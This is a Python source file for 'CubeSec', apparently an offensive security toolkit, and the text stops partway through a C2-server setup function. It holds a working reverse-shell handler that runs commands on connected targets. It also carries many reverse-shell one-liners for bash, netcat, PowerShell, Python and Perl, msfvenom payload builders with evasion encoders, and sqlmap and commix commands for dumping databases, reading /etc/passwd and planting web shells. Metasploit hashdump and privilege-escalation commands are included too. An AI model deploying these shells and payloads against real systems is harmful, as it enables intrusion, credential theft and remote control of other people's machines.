#!/usr/bin/env python3
# hey null check line 456 Left a comment for you
# CubeSec — offensive reference toolkit
# Credits: https://github.com/jasuasau (LowLevelAsCanGet)
#          https://github.com/Nul1Ro0ts (Null1Roots)
#          https://github.com/t3l3machus/Villain

import os
import socket
import time
import threading
import subprocess
import shutil
import sys

from rich.console import Console, Group
from rich.table import Table
from rich.panel import Panel
from rich.prompt import Prompt, Confirm
from rich.syntax import Syntax
from rich.text import Text
from rich.align import Align
from rich.columns import Columns
from rich.rule import Rule

console = Console()

RED      = "#ff3b3b"   # primary accent
RED_DIM  = "#8a1f1f"   # borders / dim
RED_BRT  = "#ff6b6b"   # highlights
INK      = "#d8d8d8"   # body text
MUTED    = "#6b6b6b"   # secondary text

class ShellSession:
    """One connected reverse-shell callback."""

    def __init__(self, conn, addr, sid):
        self.conn = conn
        self.addr = addr
        self.sid = sid
        self.host = addr[0]
        self.port = addr[1]
        self.buf = b""
        self.lock = threading.Lock()
        self.alive = True
        self.connected_at = time.time()
        threading.Thread(target=self._reader, daemon=True).start()

    def _reader(self):
        while self.alive:
            try:
                data = self.conn.recv(4096)
            except OSError:
                break
            if not data:
                break
            with self.lock:
                self.buf += data
        self.alive = False

    def send(self, cmd):
        if not self.alive:
            return False
        try:
            self.conn.sendall(cmd.encode(errors="replace") + b"\n")
            return True
        except OSError:
            self.alive = False
            return False

    def drain_until_idle(self, idle=0.6, max_wait=15.0):
        """Collect output until the target goes quiet for `idle` seconds."""
        start = last = time.time()
        out = b""
        while time.time() - start < max_wait:
            got = False
            with self.lock:
                if self.buf:
                    out += self.buf
                    self.buf = b""
                    got = True
            if got:
                last = time.time()
            elif out and (time.time() - last) > idle:
                break
            if not self.alive:
                break
            time.sleep(0.05)
        with self.lock:
            out += self.buf
            self.buf = b""
        return out.decode(errors="replace")

    def close(self):
        self.alive = False
        try:
            self.conn.shutdown(socket.SHUT_RDWR)
        except OSError:
            pass
        try:
            self.conn.close()
        except OSError:
            pass


class SessionManager:
    def __init__(self):
        self.sessions = {}
        self.next_id = 1
        self.lock = threading.Lock()
        self._server = None
        self._running = False
        self.notices = []

    @property
    def listening(self):
        return self._running

    def start_listener(self, host, port):
        if self._running:
            return False, "Listener already running."
        try:
            srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            srv.bind((host, int(port)))
            srv.listen(10)
        except OSError as e:
            return False, f"Bind failed: {e}"
        self._server = srv
        self._running = True
        threading.Thread(target=self._accept_loop, daemon=True).start()
        return True, f"Listening on {host}:{port}"

    def _accept_loop(self):
        while self._running and self._server:
            try:
                conn, addr = self._server.accept()
            except OSError:
                break
            with self.lock:
                sid = self.next_id
                self.next_id += 1
                self.sessions[sid] = ShellSession(conn, addr, sid)
                self.notices.append(
                    f"session {sid} opened from {addr[0]}:{addr[1]}"
                )

    def stop_listener(self):
        self._running = False
        if self._server:
            try:
                self._server.close()
            except OSError:
                pass
        self._server = None

    def list_sessions(self):
        with self.lock:
            return list(self.sessions.values())

    def get(self, sid):
        with self.lock:
            return self.sessions.get(sid)

    def remove(self, sid):
        with self.lock:
            sess = self.sessions.pop(sid, None)
        if sess:
            sess.close()
        return sess

    def reap_dead(self):
        dead = [s.sid for s in self.list_sessions() if not s.alive]
        for sid in dead:
            self.remove(sid)
        return dead

    def pop_notices(self):
        with self.lock:
            out = self.notices[:]
            self.notices = []
        return out


SHELLS = SessionManager()

REVERSE_SHELLS = {
    "PowerShell TCP": "$c=New-Object Net.Sockets.TCPClient(\"LHOST\",LPORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$rb=[Text.Encoding]::ASCII.GetBytes($r);$s.Write($rb,0,$rb.Length)}",
    "PowerShell Base64": "powershell -nop -w hidden -e BASE64BLOB",
    "CMD nc.exe": "nc.exe -e cmd.exe LHOST LPORT",
    "Python TCP": "python -c \"import socket,subprocess,os;s=socket.socket();s.connect(('LHOST',LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['cmd.exe'])\"",
    "Python3 TCP": "python3 -c \"import socket,subprocess,os;s=socket.socket();s.connect(('LHOST',LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/bash','-i'])\"",
    "Bash TCP": "bash -i >& /dev/tcp/LHOST/LPORT 0>&1",
    "Bash 196": "0<&196;exec 196<>/dev/tcp/LHOST/LPORT; sh <&196 >&196 2>&196",
    "Perl TCP": "perl -e 'use Socket;$i=\"LHOST\";$p=LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'",
    "Ruby TCP": "ruby -rsocket -e 'f=TCPSocket.open(\"LHOST\",LPORT).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
    "PHP exec": "php -r '$sock=fsockopen(\"LHOST\",LPORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
    "Netcat -e": "nc -e /bin/sh LHOST LPORT",
    "Netcat mkfifo": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc LHOST LPORT >/tmp/f",
    "Socat": "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:LHOST:LPORT",
    "Awk": "awk 'BEGIN{s=\"/inet/tcp/0/LHOST/LPORT\";while(42){do{printf \"$ \"|&s;s|&getline c;if(c){while((c|&getline)>0)print $0|&s;close(c)}}while(c!=\"exit\")close(s)}}'",
}

SHELL_UPGRADES = {
    "Python PTY (target)": "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
    "python -c PTY (target)": "python -c 'import pty; pty.spawn(\"/bin/bash\")'",
    "script PTY (target)": "script -qc /bin/bash /dev/null",
    "Socat PTY (target)": "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:LHOST:LPORT",
    "Background session": "Ctrl+Z",
    "Local raw mode": "stty raw -echo",
    "Local foreground": "fg",
    "Local reset/echo": "stty sane; reset",
    "Fix TERM (target)": "export TERM=xterm",
    "Check size (target)": "stty size",
    "Match size (local)": "stty rows ROWS cols COLS",
}

def handler_for(payload_module, lhost="LHOST", lport="LPORT"):
    return (
        f'msfconsole -q -x "use exploit/multi/handler; '
        f'set payload {payload_module}; set LHOST {lhost}; set LPORT {lport}; '
        f'set ExitOnSession false; run -j; sessions -l"'
    )

LISTENERS = {
    "Netcat (classic)": {
        "cmd": "nc -lvnp LPORT",
        "desc": "Plain nc listener in the foreground. Ctrl+C to stop.",
    },
    "Netcat (no DNS)": {
        "cmd": "nc -nvklp LPORT",
        "desc": "Skip reverse lookup, keep listening after a session drops.",
    },
    "rlwrap + Netcat": {
        "cmd": "rlwrap -r nc -lvnp LPORT",
        "desc": "Netcat with line-editing/history — usable interactive shell.",
    },
    "Ncat (SSL)": {
        "cmd": "ncat -lvnp LPORT --ssl",
        "desc": "TLS-wrapped listener — dodges plaintext inspection.",
    },
    "Socat (Full TTY)": {
        "cmd": "socat TCP-LISTEN:LPORT,reuseaddr FILE:`tty`,raw,echo=0",
        "desc": "Socat TTY listener. Pair with the socat shell-upgrade one-liner.",
    },
    "Socat (fork/reuse)": {
        "cmd": "socat -d -d TCP-LISTEN:LPORT,reuseaddr,fork STDOUT",
        "desc": "Debug (+2 verbosity) socat listener, handles reconnections.",
    },
    "Metasploit Handler": {
        "cmd": handler_for("PAYLOAD"),
        "desc": "multi/handler for a matching payload. Runs as a background job.",
    },
    "Python Listener": {
        "cmd": "python3 -c \"import socket,os; s=socket.socket(); s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1); s.bind(('LHOST',LPORT)); s.listen(1); c,a=s.accept(); print('[+] from',a); os.dup2(c.fileno(),0); os.dup2(c.fileno(),1); os.dup2(c.fileno(),2); os.system('/bin/bash -i')\"",
        "desc": "Pure-python shell catcher, no nc/socat required.",
    },
}

MSFVENOM_PAYLOADS = {
    "windows/meterpreter/reverse_tcp (exe)": {
        "cmd": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=LHOST LPORT=LPORT -f exe -o payload.exe",
        "desc": "Staged reverse TCP Meterpreter for Windows",
    },
    "windows/meterpreter/reverse_http (dll)": {
        "cmd": "msfvenom -p windows/meterpreter/reverse_http LHOST=LHOST LPORT=80 -f dll -o payload.dll",
        "desc": "HTTP reverse Meterpreter (firewall bypass)",
    },
    "windows/shell_reverse_tcp (exe)": {
        "cmd": "msfvenom -p windows/shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f exe -o shell.exe",
        "desc": "Non-staged cmd.exe reverse shell",
    },
    "linux/x86/meterpreter/reverse_tcp (elf)": {
        "cmd": "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=LHOST LPORT=LPORT -f elf -o payload.elf",
        "desc": "32-bit Linux Meterpreter",
    },
    "linux/x64/meterpreter/reverse_tcp (elf)": {
        "cmd": "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=LHOST LPORT=LPORT -f elf -o payload.elf",
        "desc": "64-bit Linux Meterpreter",
    },
    "php/meterpreter/reverse_tcp": {
        "cmd": "msfvenom -p php/meterpreter/reverse_tcp LHOST=LHOST LPORT=LPORT -f raw -o payload.php",
        "desc": "PHP web shell Meterpreter",
    },
    "python/meterpreter/reverse_tcp": {
        "cmd": "msfvenom -p python/meterpreter/reverse_tcp LHOST=LHOST LPORT=LPORT -f raw -o payload.py",
        "desc": "Python reverse Meterpreter",
    },
    "android/meterpreter/reverse_tcp (apk)": {
        "cmd": "msfvenom -p android/meterpreter/reverse_tcp LHOST=LHOST LPORT=LPORT -o payload.apk",
        "desc": "Android APK Meterpreter",
    },
    "java/jsp_shell_reverse_tcp (war)": {
        "cmd": "msfvenom -p java/jsp_shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f war -o shell.war",
        "desc": "JSP war shell for Tomcat/app servers",
    },
}

MSFVENOM_ENCODERS = {
    "x86/shikata_ga_nai": "Polymorphic XOR additive feedback encoder (most reliable)",
    "x86/jmp_call_additive": "Jump/Call XOR additive feedback encoder",
    "x86/fnstenv_mov": "Single-byte XOR using FPU state",
    "x64/xor": "64-bit XOR encoder",
    "cmd/powershell_base64": "Base64 + PowerShell encoding",
}

MSFVENOM_OPTIONS = {
    "-p, --payload": "Payload module (windows/meterpreter/reverse_tcp, etc)",
    "-f, --format": "Output format (exe, dll, elf, python, php, raw, vba, vbs, aspx)",
    "-e, --encoder": "Encoder to use (shikata_ga_nai recommended)",
    "-i, --iterations": "Number of encode passes (1-255, default 1)",
    "-b, --bad-chars": "Chars to avoid (e.g. '\\x00\\xff')",
    "-o, --out": "Output file path",
    "-x, --template": "Custom executable template for payload injection",
    "-k, --keep": "Preserve template behavior, inject payload as thread",
    "-a, --arch": "Architecture (x86, x64, armle, etc)",
    "--platform": "Target platform (Windows, Linux, OSX, Android, etc)",
    "-s, --space": "Max payload size in bytes",
}

SQLMAP_OPTIONS = {
    "Basic Scan": "sqlmap -u 'URL' --dbs",
    "List Tables": "sqlmap -u 'URL' -D dbname --tables",
    "Dump Table": "sqlmap -u 'URL' -D dbname -T tablename --dump",
    "Read File": "sqlmap -u 'URL' --file-read=/etc/passwd",
    "Write File": "sqlmap -u 'URL' --file-write=payload.php --file-dest=/var/www/html/shell.php",
    "Batch Mode": "sqlmap -u 'URL' --batch --dbs",
    "Custom Injection": "sqlmap -u 'URL' -p parameter --technique=BEUSTQ",
    "Time-Based Blind": "sqlmap -u 'URL' --technique=T --time-sec=5",
    "OS Shell": "sqlmap -u 'URL' --os-shell",
    "Proxy": "sqlmap -u 'URL' --proxy='http://127.0.0.1:8080' --dbs",
    "Cookie Auth": "sqlmap -u 'URL' --cookie='PHPSESSID=abc123' --dbs",
    "POST Data": "sqlmap -u 'URL' --data='id=1&name=test' -p id --dbs",
    "Tamper Scripts": "sqlmap -u 'URL' --tamper=space2comment,between --dbs",
}

COMMIX_OPTIONS = {
    "Basic Scan": "commix -u 'URL' --os-shell",
    "Enum OS": "commix -u 'URL' --sys-info",
    "Read File": "commix -u 'URL' --file-read=/etc/passwd",
    "Write File": "commix -u 'URL' --file-write=payload.sh --file-dest=/tmp/payload.sh",
    "Check Root": "commix -u 'URL' --is-root",
    "Enumerate Users": "commix -u 'URL' --users",
    "Get Passwords": "commix -u 'URL' --passwords",
    "Shellshock Detection": "commix -u 'URL' --shellshock",
    "Batch Mode": "commix -u 'URL' --batch",
    "Custom Injection": "commix -u 'URL' --eval=php",
    "Time Delay": "commix -u 'URL' --time-sec=5",
    "OOB Channel": "commix -u 'URL' --oob",
    "Proxy": "commix -u 'URL' --proxy='http://127.0.0.1:8080'",
}

METASPLOIT_COMMANDS = {
    "Module Management": {
        "show all": "Display all modules",
        "search type:exploit": "Search exploits",
        "search type:payload": "Search payloads",
        "search type:encoder": "Search encoders",
        "use exploit/module/name": "Load exploit module",
        "back": "Exit current module context",
        "info": "Show module info",
        "options": "Show module options",
        "advanced": "Show advanced options",
    },
    "Session & Handler": {
        "use exploit/multi/handler": "Start payload handler",
        "set payload windows/meterpreter/reverse_tcp": "Set payload type",
        "set LHOST 0.0.0.0": "Listen on all interfaces",
        "set LPORT 4444": "Set listen port",
        "run -j": "Run handler as background job",
        "exploit -j": "Run exploit as job",
        "sessions": "List active sessions",
        "sessions -i 1": "Interact with session 1",
        "background": "Background current session",
    },
    "Post Exploitation": {
        "upload /path/to/file /tmp/": "Upload file to target",
        "download /tmp/file ./": "Download file from target",
        "shell": "Drop to system shell",
        "getsystem": "Escalate privileges",
        "hashdump": "Dump SAM hashes (Windows)",
        "getuid": "Show current user",
        "getpid": "Show process ID",
        "migrate PID": "Migrate to process",
        "run post/windows/gather/enum_logged_in_users": "Enum logged-in users",
    },
    "Payload Options": {
        "set LHOST 192.168.1.100": "Callback IP",
        "set LPORT 4444": "Callback port",
        "set RHOST 192.168.1.50": "Target host",
        "set RPORT 445": "Target port",
        "generate -f exe -o payload.exe": "Generate payload file",
    },
}

def banner():
    """Red CubeSec header."""
    console.clear()
    art = Text()
    art.append("\n")
    art.append(r"""
================================================================
     ██████ ██    ██ ██████  ███████ ███████ ███████  ██████
    ██      ██    ██ ██   ██ ██      ██      ██      ██
    ██      ██    ██ ██████  █████   ███████ █████   ██
    ██      ██    ██ ██   ██ ██           ██ ██      ██
     ██████  ██████  ██████  ███████ ███████ ███████  ██████
================================================================
""", style=f"bold {RED}")
    art.append("\n  </ Welcome to CubeSec  Enjoy Your Stay /> \n", style=f"bold {RED_BRT}")
    art.append("  Credits: \n\n  https://github.com/jasuasau\n  Aka LowLevelAsCanGet\n\n  https://github.com/Nul1Ro0ts\n  Aka Null1Roots", style=MUTED)
    console.print(Align.center(art))
    console.print(Rule(style=RED_DIM))

def pause(msg="Press Enter to continue..."):
    console.print()
    console.input(f"[{MUTED}]{msg}[/{MUTED}]")

def copy_to_clipboard(text):
    try:
        if shutil.which("xclip"):
            subprocess.Popen(["xclip", "-selection", "clipboard"],
                             stdin=subprocess.PIPE).communicate(text.encode())
            return True
        if shutil.which("pbcopy"):
            subprocess.Popen(["pbcopy"], stdin=subprocess.PIPE).communicate(text.encode())
            return True
        if shutil.which("wl-copy"):
            subprocess.Popen(["wl-copy"], stdin=subprocess.PIPE).communicate(text.encode())
            return True
    except Exception:
        pass
    return False

def make_card(label, key):
    """One selectable 'button' card."""
    return Panel(
        Align.center(Text.from_markup(f"[bold {RED_BRT}]{key}[/bold {RED_BRT}]\n\n[{INK}]{label}[/{INK}]")),
        border_style=RED_DIM,
        padding=(1, 2),
        width=30,
    )

def card_grid(title, items, back_label="⟵ Back"):
    console.clear()
    banner()
    console.print(Rule(f"[bold {RED}]{title}[/bold {RED}]", style=RED_DIM))
    console.print()

    cards = [make_card(label, f"[{i+1}]") for i, label in enumerate(items)]
    cards.append(Panel(
        Align.center(Text(f"[{len(items)+1}]\n\n{back_label}", style=f"bold {MUTED}")),
        border_style=MUTED, padding=(1, 2), width=30,
    ))

    console.print(Columns(cards, equal=True, expand=True, align="center"))
    console.print()

    raw = Prompt.ask(
        f"[bold {RED}]Select[/bold {RED}] "
        f"[{MUTED}](1-{len(items)+1}, q to go back)[/{MUTED}]",
        default="1",
    ).strip()

    if raw.lower() in ("q", "back", ""):
        return 0
    try:
        n = int(raw)
        if n == len(items) + 1:
            return 0
        if 1 <= n <= len(items):
            return n
    except ValueError:
        pass
    return None  # invalid

def print_remote_output(text):
    if not text:
        return
    console.print(text.rstrip("\n"), style=INK, markup=False, highlight=False)

def show_upgrade_reference():
    lines = list(SHELL_UPGRADES.items())
    while True:
        console.clear(); banner()
        table = Table(title=f"[bold {RED}]Shell Upgrade (Full TTY)[/bold {RED}]",
                      border_style=RED_DIM, header_style=f"bold {RED_BRT}")
        table.add_column("#", style=f"bold {RED_BRT}", width=4)
        table.add_column("Step", style=RED_BRT, width=24)
        table.add_column("Command", style=INK)
        for i, (label, cmd) in enumerate(lines, 1):
            table.add_row(str(i), label, cmd)
        console.print(table)
        console.print(f"[{MUTED}]Flow: spawn PTY on target -> Ctrl+Z -> local raw mode -> fg -> set TERM and stty size.[/{MUTED}]")
        console.print()
        raw = Prompt.ask(
            f"[bold {RED}]Copy line #[/bold {RED}] "
            f"[{MUTED}](1-{len(lines)}, q to go back)[/{MUTED}]",
            default="q",
        ).strip()
        if raw.lower() in ("q", "back", ""):
            return
        try:
            n = int(raw)
            if 1 <= n <= len(lines):
                cmd = lines[n - 1][1]
                console.print(f"[{RED_BRT}]✓ Copied[/{RED_BRT}]" if copy_to_clipboard(cmd)
                              else f"[{MUTED}]⚠ Clipboard tool not found[/{MUTED}]")
                pause()
        except ValueError:
            pass

def run_listener(cmd):
    console.clear(); banner()
    console.print(Panel(
        Syntax(cmd, "bash", theme="monokai", line_numbers=False),
        title=f"[bold {RED}]Listener[/bold {RED}]",
        border_style=RED_DIM,
    ))
    console.print(f"[{MUTED}]Runs in the foreground. Press Ctrl+C to stop and return.[/{MUTED}]")
    if Confirm.ask("Start listener now?", default=True):
        try:
            os.system(cmd)
        except KeyboardInterrupt:
            pass
    pause()

def build_listener_cmd(entry, ask_payload=False):
    cmd = entry["cmd"]
    if ask_payload or "PAYLOAD" in cmd:
        payload = Prompt.ask(
            f"[bold {RED}]Handler Payload[/bold {RED}]",
            default="windows/x64/meterpreter/reverse_tcp",
        )
        cmd = cmd.replace("PAYLOAD", payload)
    lhost = Prompt.ask(f"[bold {RED}]LHOST[/bold {RED}]", default="0.0.0.0")
    lport = Prompt.ask(f"[bold {RED}]LPORT[/bold {RED}]", default="4444")
    return cmd.replace("LHOST", lhost).replace("LPORT", str(lport))

def show_command(title, cmd_text, desc="", listen_template=None):
    while True:
        console.clear()
        banner()

        body = []
        if desc:
            body.append(Text(desc, style=MUTED))
            body.append(Text())
        body.append(Panel(
            Syntax(cmd_text, "bash", theme="monokai", line_numbers=False),
            title=f"[bold {RED}]{title}[/bold {RED}]",
            border_style=RED_DIM,
            expand=False,
        ))
        console.print(Group(*body))
        console.print()

        action = Prompt.ask(
            f"[bold {RED}]Action[/bold {RED}] "
            f"[{MUTED}][1]Copy  [2]Execute  [3]Edit  [4]Listener  "
            f"[5]Upgrade  [6]Back[/{MUTED}]",
            choices=["1", "2", "3", "4", "5", "6"], default="6",
        )

        if action == "6":
            return
        if action == "1":
            console.print(f"[{RED_BRT}]✓ Copied[/{RED_BRT}]" if copy_to_clipboard(cmd_text)
                          else f"[{MUTED}]⚠ Clipboard tool not found[/{MUTED}]")
            pause()
        elif action == "2":
            if Confirm.ask("Execute this command?", default=False):
                console.print(f"\n[{MUTED}]{cmd_text}[/{MUTED}]\n")
                os.system(cmd_text)
            pause()
        elif action == "3":
            cmd_text = Prompt.ask("Edit command")
        elif action == "4":
            if listen_template:
                run_listener(listen_template)
            else:
                console.print(f"[{MUTED}]No matching listener for this item.[/{MUTED}]")
                pause()
        elif action == "5":
            show_upgrade_reference()

def customize_payload(template, listen_template=None):
    console.clear()
    banner()
    lhost = Prompt.ask(f"[bold {RED}]LHOST[/bold {RED}]", default="10.10.10.10")
    lport = Prompt.ask(f"[bold {RED}]LPORT[/bold {RED}]", default="4444")
    payload = template.replace("LHOST", lhost).replace("LPORT", str(lport))

    listener = None
    if listen_template:
        listener = listen_template.replace("LHOST", lhost).replace("LPORT", str(lport))

    show_command("Customized Payload", payload, listen_template=listener)

def browse_reverse_shells():
    items = list(REVERSE_SHELLS.keys())
    while True:
        sel = card_grid("Reverse Shells", items)
        if sel is None or sel == 0:
            return
        name = items[sel - 1]
        customize_payload(REVERSE_SHELLS[name], listen_template="nc -lvnp LPORT")

def browse_msfvenom_payloads():
    items = list(MSFVENOM_PAYLOADS.keys())
    while True:
        sel = card_grid("Msfvenom Payloads", items)
        if sel is None or sel == 0:
            return
        name = items[sel - 1]
        data = MSFVENOM_PAYLOADS[name]
        payload_module = name.split(" ")[0]
        customize_payload(data["cmd"], listen_template=handler_for(payload_module))

def show_encoder_reference():
    console.clear(); banner()
    table = Table(title=f"[bold {RED}]Msfvenom Encoders[/bold {RED}]",
                  border_style=RED_DIM, header_style=f"bold {RED_BRT}")
    table.add_column("Encoder", style=RED_BRT)
    table.add_column("Description", style=INK)
    for enc, desc in MSFVENOM_ENCODERS.items():
        table.add_row(enc, desc)
    console.print(table)
    pause()

def show_msfvenom_options():
    console.clear(); banner()
    table = Table(title=f"[bold {RED}]Msfvenom Options[/bold {RED}]",
                  border_style=RED_DIM, header_style=f"bold {RED_BRT}")
    table.add_column("Option", style=RED_BRT)
    table.add_column("Description", style=INK)
    for opt, desc in MSFVENOM_OPTIONS.items():
        table.add_row(opt, desc)
    console.print(table)
    pause()

def msfvenom_builder():
    console.clear(); banner()
    payload = Prompt.ask(f"[bold {RED}]Payload[/bold {RED}]",
                         default="windows/meterpreter/reverse_tcp")
    lhost = Prompt.ask(f"[bold {RED}]LHOST[/bold {RED}]", default="10.10.10.10")
    lport = Prompt.ask(f"[bold {RED}]LPORT[/bold {RED}]", default="4444")
    fmt = Prompt.ask(f"[bold {RED}]Format[/bold {RED}]", default="exe")
    out = Prompt.ask(f"[bold {RED}]Output file[/bold {RED}]", default="payload.exe")
    enc = Prompt.ask(f"[bold {RED}]Encoder[/bold {RED}] [{MUTED}](optional)[/{MUTED}]", default="")

    cmd = f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f {fmt} -o {out}"
    if enc:
        cmd += f" -e {enc} -i 3"
    show_command("Generated Msfvenom Command", cmd,
                 listen_template=handler_for(payload, lhost, lport))

def browse_msfvenom():
    while True:
        sel = card_grid("Msfvenom Toolkit",
                        ["Payloads", "Encoders", "Options",
                         "Command Builder", "Auto Handler"])
        if sel is None or sel == 0:
            return
        if sel == 1:
            browse_msfvenom_payloads()
        elif sel == 2:
            show_encoder_reference()
        elif sel == 3:
            show_msfvenom_options()
        elif sel == 4:
            msfvenom_builder()
        elif sel == 5:
            start_msf_handler()

def browse_sqlmap():
    items = list(SQLMAP_OPTIONS.keys())
    while True:
        sel = card_grid("SQL Injection", items)
        if sel is None or sel == 0:
            return
        name = items[sel - 1]
        cmd = SQLMAP_OPTIONS[name]
        if "URL" in cmd or "dbname" in cmd:
            url = Prompt.ask(f"[bold {RED}]Target URL[/bold {RED}]",
                             default="http://target/vuln.php?id=1")
            cmd = cmd.replace("URL", url)
        show_command(name, cmd)

def browse_commix():
    items = list(COMMIX_OPTIONS.keys())
    while True:
        sel = card_grid("Commix OS Injection", items)
        if sel is None or sel == 0:
            return
        name = items[sel - 1]
        cmd = COMMIX_OPTIONS[name]
        if "URL" in cmd:
            url = Prompt.ask(f"[bold {RED}]Target URL[/bold {RED}]",
                             default="http://target/vuln.php?id=1")
            cmd = cmd.replace("URL", url)
        show_command(name, cmd)

def show_metasploit_category(cat_name, commands):
    items = list(commands.keys())
    while True:
        console.clear(); banner()
        table = Table(title=f"[bold {RED}]{cat_name}[/bold {RED}]",
                      border_style=RED_DIM, header_style=f"bold {RED_BRT}")
        table.add_column("#", style=f"bold {RED_BRT}", width=4)
        table.add_column("Command", style=RED_BRT, width=42)
        table.add_column("Description", style=INK)
        for i, (cmd, desc) in enumerate(commands.items(), 1):
            table.add_row(str(i), cmd, desc)
        console.print(table)
        console.print()
        raw = Prompt.ask(
            f"[bold {RED}]Copy command #[/bold {RED}] "
            f"[{MUTED}](1-{len(items)}, q to go back)[/{MUTED}]",
            default="q",
        ).strip()
        if raw.lower() in ("q", "back", ""):
            return
        try:
            n = int(raw)
            if 1 <= n <= len(items):
                cmd = items[n - 1]
                console.print(f"[{RED_BRT}]✓ Copied[/{RED_BRT}]" if copy_to_clipboard(cmd)
                              else f"[{MUTED}]⚠ Clipboard tool not found[/{MUTED}]")
                pause()
        except ValueError:
            pass

def browse_metasploit():
    cats = list(METASPLOIT_COMMANDS.keys())
    while True:
        sel = card_grid("Metasploit Commands", cats, back_label="⟵ Back")
        if sel is None or sel == 0:
            return
        cat = cats[sel - 1]
        show_metasploit_category(cat, METASPLOIT_COMMANDS[cat])

def browse_listeners():
    items = list(LISTENERS.keys())
    while True:
        sel = card_grid("Listeners & Handlers", items)
        if sel is None or sel == 0:
            return
        entry = LISTENERS[items[sel - 1]]
        run_listener(build_listener_cmd(entry))

def start_msf_handler():
    console.clear(); banner()
    payload = Prompt.ask(f"[bold {RED}]Handler Payload[/bold {RED}]",
                         default="windows/x64/meterpreter/reverse_tcp")
    lhost = Prompt.ask(f"[bold {RED}]LHOST[/bold {RED}]", default="0.0.0.0")
    lport = Prompt.ask(f"[bold {RED}]LPORT[/bold {RED}]", default="4444")
    run_listener(handler_for(payload, lhost, str(lport)))

def session_table():
    SHELLS.reap_dead()
    console.clear(); banner()
    for note in SHELLS.pop_notices():
        console.print(f"[{RED_BRT}][+] {note}[/{RED_BRT}]")
    console.print()

    sessions = SHELLS.list_sessions()
    status = (f"[{RED_BRT}]LISTENING[/{RED_BRT}]"
              if SHELLS.listening else f"[{MUTED}]STOPPED[/{MUTED}]")
    console.print(f"  Handler: {status}   Sessions: [{RED_BRT}]{len(sessions)}[/{RED_BRT}]")
    console.print()

    if sessions:
        table = Table(border_style=RED_DIM, header_style=f"bold {RED_BRT}")
        table.add_column("ID", style=f"bold {RED_BRT}", width=5)
        table.add_column("Remote", style=INK)
        table.add_column("Age", style=MUTED, width=10)
        table.add_column("State", style=INK, width=8)
        for s in sessions:
            age = int(time.time() - s.connected_at)
            table.add_row(str(s.sid), f"{s.host}:{s.port}", f"{age}s",
                          "alive" if s.alive else "dead")
        console.print(table)
    else:
        console.print(f"  [{MUTED}]No sessions yet.[/{MUTED}]")
    console.print()

def interact_session(sess):
    """Interactive console that runs commands on the connected target."""
    console.clear(); banner()
    console.print(f"  [{RED_BRT}]Session {sess.sid}[/{RED_BRT}] "
                  f"[{MUTED}]->[/{MUTED}] {sess.host}:{sess.port}")
    console.print(f"  [{MUTED}]Commands run on the TARGET. "
                  f"'bg' background · 'exit' close · 'sessions' list.[/{MUTED}]")
    console.print()

    print_remote_output(sess.drain_until_idle())

    while True:
        if not sess.alive:
            console.print(f"\n[{RED}]Session {sess.sid} closed by remote.[/{RED}]")
            SHELLS.remove(sess.sid)
            pause()
            return
        try:
            cmd = Prompt.ask(f"[bold {RED}]cube[/bold {RED}]"
                             f"[{MUTED}]@{sess.sid}[/{MUTED}]"
                             f"[{RED_BRT}]$[/{RED_BRT}]")
        except (KeyboardInterrupt, EOFError):
            return
        stripped = cmd.strip()
        low = stripped.lower()

        if low in ("bg", "background", "q", "quit", "back", ""):
            return
        if low in ("exit", "close", "kill"):
            sess.send("exit")
            sess.close()
            SHELLS.remove(sess.sid)
            return
        if low == "sessions":
            for s in SHELLS.list_sessions():
                console.print(f"  {s.sid}\t{s.host}:{s.port}\t"
                              f"{'alive' if s.alive else 'dead'}")
            continue

        if not sess.send(cmd):
            console.print(f"[{RED}]Send failed — session is dead.[/{RED}]")
            SHELLS.remove(sess.sid)
            pause()
            return
        print_remote_output(sess.drain_until_idle())

def shell_sessions_menu():
    while True:
        session_table()

        sess_list = SHELLS.list_sessions()
        opts = ["Stop handler" if SHELLS.listening else "Start handler", "Refresh"]
        for s in sess_list:
            opts.append(f"Interact: {s.sid} ({s.host}:{s.port})")

        sel = card_grid("Shell Sessions (Multi-Handler)", opts, back_label="⟵ Back")
        if sel is None or sel == 0:
            return

        choice = opts[sel - 1]
        if choice == "Start handler":
            console.clear(); banner()
            host = Prompt.ask(f"[bold {RED}]Bind host[/bold {RED}]", default="0.0.0.0")
            port = Prompt.ask(f"[bold {RED}]Bind port[/bold {RED}]", default="4444")
            ok, msg = SHELLS.start_listener(host, port)
            style = RED_BRT if ok else RED
            console.print(f"[{style}]{msg}[/{style}]")
            pause()
        elif choice == "Stop handler":
            SHELLS.stop_listener()
            console.print(f"[{MUTED}]Handler stopped.[/{MUTED}]")
            pause()
        elif choice == "Refresh":
            continue
        elif choice.startswith("Interact: "):
            sid = int(choice.split()[1])
            sess = SHELLS.get(sid)
            if sess:
                interact_session(sess)

def c2_server():
    """Villain C2 Framework integration — configuration and launch."""
    console.clear(); banner()

    console.print(Rule(f"[bold {RED}]Villain C2 Server[/bold {RED}]", style=RED_DIM))
    console.print()

    console.print(Panel(
        Text("[+] Configure Villain C2 infrastructure\n"
             "[+] All ports configurable for multi-C2 ops\n"
             "[+] Full framework ready for deployment",
             style=INK),
